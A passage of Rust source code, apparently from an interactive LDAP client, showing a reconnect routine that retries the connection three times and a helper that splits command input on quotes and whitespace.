        || error_msg.contains("Connection lost")
        || error_msg.contains("timed out")
}

fn attempt_reconnect(
    ldap_config: &mut ldap::LdapConfig,
) -> Result<ldap3::LdapConn, Box<dyn std::error::Error>> {
    println!("[*] Attempting to reconnect...");

    let mut attempts = 0;
    let max_attempts = 3;

    while attempts < max_attempts {
        attempts += 1;
        if attempts > 1 {
            println!("[*] Reconnection attempt {} of {}", attempts, max_attempts);
            std::thread::sleep(std::time::Duration::from_secs(2));
        }

        match ldap::ldap_connect(ldap_config) {
            Ok((conn, _)) => return Ok(conn),
            Err(e) => {
                if attempts < max_attempts {
                    eprintln!("[!] Reconnection failed: {}. Retrying...", e);
                } else {
                    return Err(Box::new(e));
                }
            }
        }
    }

    Err("Maximum reconnection attempts reached".into())
}

fn parse_quoted_args(input: &str) -> Vec<String> {
    input
        .trim()
        .split('"')
        .enumerate()
        .flat_map(|(i, s)| {
            if i % 2 == 0 {
                s.split_whitespace().map(String::from).collect()
            } else {
                vec![s.to_string()]
            }
        })
        .filter(|s| !s.is_empty())
        .collect()
}
